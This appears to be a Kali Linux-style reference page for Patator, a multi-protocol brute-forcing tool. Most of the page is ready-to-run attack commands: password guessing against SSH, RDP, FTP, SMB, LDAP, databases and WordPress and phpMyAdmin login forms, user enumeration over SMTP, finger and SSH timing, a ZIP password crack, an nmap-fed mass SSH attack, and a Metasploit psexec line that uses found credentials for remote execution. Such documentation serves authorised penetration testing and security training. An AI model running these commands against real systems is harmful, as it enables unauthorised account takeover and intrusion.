---
title: "Patator - Multi-Purpose Brute-Forcer"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "Network Attacks"
tags:
  - "patator"
  - "brute-force"
  - "password-cracking"
  - "python"
  - "multi-purpose"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "0.7-beta"
tool_url: "https://github.com/lanjelot/patator"
kali_url: "https://www.kali.org/tools/patator/"
license: "GPL-2.0"
---

# Patator - Multi-Purpose Brute-Forcer

## Overview

**Patator** is a multi-purpose brute-forcer written in Python with a modular design and flexible usage. It was created out of frustration from using Hydra, Medusa, Ncrack, Metasploit modules, and Nmap NSE scripts for password guessing attacks. Patator takes a different approach, avoiding the shortcomings of other brute-forcing tools while providing more reliability and flexibility.

**Key Features**:
- **Modular design** - Each service is a separate module
- **Flexible input** - Multiple ways to specify targets, usernames, passwords
- **Advanced filtering** - Ignore specific responses, codes, or messages
- **Resume capability** - Resume interrupted attacks
- **Multiple protocols** - 30+ attack modules
- **Python-based** - Easy to extend and customize
- **Docker support** - Ready-to-use container

**Supported Modules**:
- **Remote Access**: SSH, Telnet, RDP, VNC, Rlogin
- **Web**: HTTP/HTTPS (GET, POST, FORM), AJP, DNS
- **Email**: SMTP (login, VRFY, RCPT), POP3, IMAP
- **Database**: MySQL, MSSQL, PostgreSQL, Oracle, MongoDB
- **File Transfer**: FTP, SMB
- **Directory**: LDAP, SNMP
- **VPN**: IKE
- **Other**: SIP, VMware Auth, WinRM, and more

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y patator
```

### From Source

```bash
# Install dependencies
pip3 install pyopenssl impacket paramiko IPy dnspython pysnmp

# Clone repository
git clone https://github.com/lanjelot/patator.git
cd patator
```

### Docker

```bash
# Build container
docker build -t patator patator/

# Run with SecLists
git clone https://github.com/danielmiessler/SecLists.git
docker run -it --rm -v $PWD/SecLists/Passwords:/mnt patator dummy_test data=FILE0 0=/mnt/richelieu-french-top5000.txt
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `MODULE` | Attack module to use |
| `key=value` | Module-specific parameters |
| `-x key:val` | Exclude rules (ignore specific responses) |
| `-l LOG` | Log directory |
| `--resume STATE` | Resume from previous state |
| `--timeout SECS` | Connection timeout |
| `--max-retries NUM` | Maximum retry attempts |
| `-t THREADS` | Number of threads |

### Module-Specific Parameters

```bash
# View module help
patator MODULE -h

# Example: SSH module
patator ssh_login -h
```

## Usage Examples

### SSH Brute Force

**Single User, Password List**:
```bash
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=/usr/share/wordlists/rockyou.txt
```

**User List, Password List**:
```bash
patator ssh_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

**With Exclusion Rules**:
```bash
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
```

### RDP Brute Force

```bash
patator rdp_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### FTP Brute Force

```bash
patator ftp_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### HTTP POST Form Brute Force

**Basic Login Form**:
```bash
patator http_fuzz url=http://192.168.1.100/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=combos.txt -x ignore:fgrep='Invalid credentials'
```

**WordPress Login**:
```bash
patator http_fuzz url=http://192.168.1.100/wp-login.php method=POST body='log=COMBO00&pwd=COMBO01&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' 0=combos.txt -x ignore:fgrep='Invalid username'
```

**phpMyAdmin**:
```bash
patator http_fuzz url=http://192.168.1.100/phpmyadmin/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php' 0=combos.txt -x ignore:fgrep='Cannot log in to the MySQL server'
```

### MySQL Brute Force

```bash
patator mysql_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt
```

### MSSQL Brute Force

```bash
patator mssql_login host=192.168.1.100 user=sa password=FILE0 0=passwords.txt
```

### PostgreSQL Brute Force

```bash
patator pgsql_login host=192.168.1.100 user=postgres password=FILE0 0=passwords.txt
```

### SMB Brute Force

```bash
patator smb_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### LDAP Brute Force

```bash
patator ldap_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### VNC Brute Force

```bash
patator vnc_login host=192.168.1.100 password=FILE0 0=passwords.txt
```

### SNMP Brute Force

```bash
patator snmp_login host=192.168.1.100 community=FILE0 0=passwords.txt
```

### DNS Brute Force

**Forward Lookup**:
```bash
patator dns_forward name=FILE0.example.com 0=names.txt -x ignore:code=3
```

**Reverse Lookup**:
```bash
patator dns_reverse host=NET0 0=192.168.1.0/24 -x ignore:code=3
```

### IKE Enumeration

```bash
patator ike_enum host=192.168.1.100 transform=MOD0 0=TRANS aggressive=RANGE1 1=int:0-1 -x ignore:fgrep='NO-PROPOSAL'
```

### ZIP Password Cracking

```bash
patator unzip_pass zipfile=encrypted.zip password=FILE0 0=rockyou.txt -x ignore:code!=0
```

### SMTP User Enumeration

**VRFY Command**:
```bash
patator smtp_vrfy host=192.168.1.100 user=FILE0 0=usernames.txt
```

**RCPT TO Command**:
```bash
patator smtp_rcpt host=192.168.1.100 user=FILE0 0=usernames.txt
```

### Finger User Enumeration

```bash
patator finger_lookup host=192.168.1.100 user=FILE0 0=usernames.txt
```

### Time-Based User Enumeration

```bash
patator ssh_login host=192.168.1.100 user=FILE0 0=logins.txt password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3
```

### Combo File Attack

```bash
# Create combo file (user:pass)
echo "admin:password123" > combos.txt
echo "root:toor" >> combos.txt

# Attack with combo file
patator ssh_login host=192.168.1.100 user=COMBO00 password=COMBO01 0=combos.txt
```

### Resume Interrupted Attack

```bash
# First attack (interrupted)
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt

# Resume attack
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt --resume 15,15,15,16,15,36,15,16,15,40
```

### Logging

```bash
# Log to directory
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -l /tmp/patator_logs
```

## Output Interpretation

### Successful Login

```
19:36:07 patator    INFO - 230   17     0.001 | ftp                                |    10 | Login successful.
```

### Failed Attempt

```
19:36:08 patator    INFO - 530   18     1.000 | root                               |     1 | Permission denied.
```

### Output Format

```
DATE TIME MODULE  INFO - CODE SIZE TIME | CANDIDATE | NUM | MESSAGE
```

- **CODE**: Response code
- **SIZE**: Response size
- **TIME**: Response time
- **CANDIDATE**: Attempted credentials
- **NUM**: Attempt number
- **MESSAGE**: Server response message

## Exclusion Rules

### Basic Exclusion

```bash
# Ignore specific message
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'

# Ignore specific code
patator http_fuzz url=http://192.168.1.100/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=combos.txt -x ignore:code=401
```

### Advanced Exclusion

```bash
# Ignore by grep pattern
patator http_fuzz url=http://192.168.1.100/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=combos.txt -x ignore:fgrep='Invalid credentials'

# Ignore by time range
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:time=0-3

# Multiple exclusion rules
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.' -x ignore:code=500
```

### Ignore, Reset, Retry

```bash
# Ignore error, reset connection, retry
patator ftp_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore,reset,retry:code=500
```

## Integration with Other Tools

### Nmap + Patator Workflow

```bash
# 1. Find services
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oG - > services.txt

# 2. Extract targets per service
grep "22/open" services.txt | awk '{print $2}' > ssh_hosts.txt

# 3. Brute force
patator ssh_login host=FILE0 0=ssh_hosts.txt user=root password=FILE1 1=passwords.txt
```

### Metasploit Integration

```bash
# After finding credentials with Patator
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser admin; set SMBPass password123; exploit"
```

## Operational Security

### Rate Limiting

```bash
# Reduce threads
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -t 1

# Add timeout
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt --timeout 10
```

### Logging

```bash
# Log to directory
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -l /tmp/patator_$(date +%Y%m%d)
```

## Common Issues and Troubleshooting

### Issue: "Connection refused"

**Cause**: Service not running or firewall blocking.

**Solution**:
```bash
# Verify service is running
nmap -p 22 192.168.1.100

# Test connection manually
ssh root@192.168.1.100
```

### Issue: "False positives"

**Cause**: Service returning success for invalid credentials.

**Solution**:
```bash
# Use exclusion rules
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'

# Use verbose mode
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -v
```

### Issue: "Slow performance"

**Cause**: Network latency or service throttling.

**Solution**:
```bash
# Increase threads
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -t 10

# Reduce timeout
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt --timeout 5
```

### Issue: "SSL certificate errors"

**Cause**: Self-signed or invalid SSL certificates.

**Solution**:
```bash
# Try different SSL options
patator https_fuzz url=https://192.168.1.100/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=combos.txt
```

## Best Practices

### Wordlist Preparation

```bash
# Use rockyou.txt
cat /usr/share/wordlists/rockyou.txt | head -10000 > top10k.txt

# Create targeted wordlist
cewl -d 2 -m 5 http://target.com -w target_wordlist.txt

# Combine wordlists
cat /usr/share/wordlists/rockyou.txt target_wordlist.txt | sort -u > combined.txt
```

### Combo File Format

```bash
# Create combo file (user:pass)
echo "admin:password123" > combos.txt
echo "root:toor" >> combos.txt

# Use combo file
patator ssh_login host=192.168.1.100 user=COMBO00 password=COMBO01 0=combos.txt
```

### Parallel Attacks

```bash
# Attack multiple hosts simultaneously
patator ssh_login host=FILE0 0=hosts.txt user=root password=FILE1 1=passwords.txt -t 10

# Attack multiple services
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt &
patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt &
wait
```

## Resources

- **GitHub Repository**: https://github.com/lanjelot/patator
- **Kali Linux Tools**: https://www.kali.org/tools/patator/
- **Wiki**: https://github.com/lanjelot/patator/wiki
- **DeepWiki**: https://deepwiki.com/lanjelot/patator
- **License**: GPL-2.0

## Related Tools

- **Hydra**: More protocol support, faster for standard protocols
- **Medusa**: Modular design, good for parallel testing
- **Ncrack**: Network authentication cracking, good for large-scale audits
- **Crowbar**: Specialized for SSH keys, OpenVPN, VNC
